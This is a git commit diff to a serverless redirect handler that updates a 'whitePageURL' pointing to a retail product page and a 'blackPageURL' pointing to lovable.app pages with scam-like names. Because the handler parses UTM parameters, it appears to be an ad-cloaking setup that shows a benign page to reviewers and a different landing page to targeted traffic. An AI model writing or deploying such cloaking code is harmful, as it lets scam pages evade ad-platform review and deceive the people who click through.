27641ffd9b95906a68e0a1b647d8889a82028e52
abdullahch3332 <abdullahch3332@gmail.com>
2025-10-30 03:20:05 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://kleman-france.com/en/417914086.html";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/seitenzugrollo-klemmfix-hitzeschutz-lichtblick-original-verdunkelnd-ohne-bohren-freihaengend-klemmfix-mit-thermobeschichtung-428837138/?variationId=1673585624";
+    const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,5 +26,6 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
